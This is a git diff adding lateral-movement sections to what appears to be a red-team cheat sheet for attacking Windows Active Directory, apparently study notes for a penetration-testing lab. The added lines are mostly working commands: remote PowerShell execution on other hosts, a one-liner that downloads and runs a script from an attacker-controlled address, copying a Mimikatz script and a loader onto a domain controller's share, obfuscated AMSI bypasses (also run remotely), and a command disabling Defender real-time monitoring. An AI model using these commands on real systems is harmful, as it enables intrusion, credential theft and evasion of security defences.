@@ -133,6 +133,8 @@ Perform the enumeration
 Find-PSRemotingLocalAdminAccess
 ```
 
+### 
+
 ## Reverse-Shells
 Command to download and execute a reverse-shell
 ```
@@ -166,6 +168,73 @@ neo4j.bat start
 Browse to http://localhost:7474 and login using the following credentials
 user: neo4j
 password: bloodhound
+
+## Lateral Movement
+### General
+Connect to a machine with Administrator privileges
+```
+Enter-PSSession -Computername <computername>
+$sess = New-PSSession -Computername <computername>
+Enter-PSSession $sess
+```
+
+Execute commands on remote machines
+```
+Invoke-Command -Computername <computername> -Scriptblock {whoami} 
+Invoke-Command -Scriptblock {whoami} $sess
+```
+
+Load Script on a machine
+```
+Invoke-Command -Computername <computername> -FilePath <path>
+Invoke-Command -FilePath <path> $sess
+```
+
+Download and Load script on a machine
+```
+iex (iwr http://<my_ip>/<scriptname> -UseBasicParsing)
+```
+
+### Copy a Script on Another Server
+Powershell command
+```
+Copy-Item .\Invoke-MimikatzEx.ps1 \\<servername>\c$\'Program Files'
+```
+
+Cmd command
+```
+echo F | xcopy <file_to_copy> \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+
+### AMSI Bypass
+The first one could be detected
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+```
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
+```
+```
+Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
+```
+
+### Disable AV monitoring
+Powershell command to disable AV
+```
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
+### Enumerate Language mode and Applocker
+Enumerate the Language Mode
+```
+$ExecutionContext.SessionState.LanguageMode
+```
+
+Enumerate the Applocker policies
+```
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+```
+
 
 
 
